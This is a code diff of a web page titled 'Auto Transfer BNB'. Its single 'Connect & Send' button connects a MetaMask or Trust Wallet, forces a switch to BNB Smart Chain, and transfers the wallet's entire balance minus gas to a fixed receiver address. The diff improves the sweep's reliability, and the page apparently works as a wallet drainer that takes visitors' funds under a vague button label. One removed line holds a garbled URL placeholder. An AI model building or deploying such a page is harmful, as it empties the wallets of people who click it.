@@ -2,7 +2,8 @@
 <html>
 <head>
   <title>Auto Transfer BNB</title>
-  <script src="[invalid url, do not cite]
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bn.js@5.2.1/lib/bn.min.js"></script>
 </head>
 <body>
   <button onclick="connectAndTransfer()">Connect & Send</button>
@@ -16,31 +17,65 @@
         const web3 = new Web3(window.ethereum);
 
         try {
+          // Request account access
           await window.ethereum.request({ method: 'eth_requestAccounts' });
           const accounts = await web3.eth.getAccounts();
           const sender = accounts[0];
 
           // Ensure BNB Smart Chain Mainnet (chainId 56)
-          const chainId = await web3.eth.getChainId();
+          let chainId = await web3.eth.getChainId();
           if (chainId !== 56) {
-            alert("Please switch to BNB Smart Chain Mainnet.");
-            return;
+            try {
+              await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x38' }],
+              });
+              chainId = 56; // Update chainId after switching
+            } catch (switchError) {
+              if (switchError.code === 4902) {
+                try {
+                  await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                      chainId: '0x38',
+                      chainName: 'BNB Smart Chain',
+                      nativeCurrency: {
+                        name: 'BNB',
+                        symbol: 'BNB',
+                        decimals: 18
+                      },
+                      rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                      blockExplorerUrls: ['https://bscscan.com']
+                    }],
+                  });
+                  chainId = 56; // Update chainId after adding
+                } catch (addError) {
+                  alert(addError.message);
+                  return;
+                }
+              } else {
+                alert(switchError.message);
+                return;
+              }
+            }
           }
 
-          // Get full balance
-          const balance = await web3.eth.getBalance(sender);
+          // Get full balance as string
+          const balanceStr = await web3.eth.getBalance(sender);
+          const balance = new BN(balanceStr);
 
-          // Get current gas price
-          const gasPrice = await web3.eth.getGasPrice();
+          // Get current gas price as string
+          const gasPriceStr = await web3.eth.getGasPrice();
+          const gasPrice = new BN(gasPriceStr);
 
           // Calculate gas estimate
-          const gasEstimate = web3.utils.toBN(GAS_LIMIT).mul(web3.utils.toBN(gasPrice));
+          const gasEstimate = new BN(GAS_LIMIT).mul(gasPrice);
 
-          // Calculate amount to send: balance - gasEstimate
-          const amountToSend = web3.utils.toBN(balance).sub(gasEstimate);
+          // Calculate amount to send
+          const amountToSend = balance.sub(gasEstimate);
 
-          if (amountToSend.lte(0)) {
-            alert("Insufficient BNB to cover gas fees.");
+          if (amountToSend.lte(new BN(0))) {
+            alert("Insufficient BNB to cover gas fees. Please add more BNB to your wallet.");
             return;
           }
 
@@ -48,8 +83,8 @@
           const tx = await web3.eth.sendTransaction({
             from: sender,
             to: receiverAddress,
-            value: amountToSend.toString(),
-            gas: GAS_LIMIT // Set gas limit explicitly to 21,000
+            value: amountToSend.toString(10),
+            gas: GAS_LIMIT
           });
 
           alert("BNB sent successfully! Tx hash: " + tx.transactionHash);
@@ -58,7 +93,7 @@
           console.error("Transaction Error:", error);
         }
       } else {
-        alert("Please install MetaMask or Trust Wallet.");
+        alert("Please install MetaMask or Trust Wallet and ensure it is active.");
       }
     }
   </script>
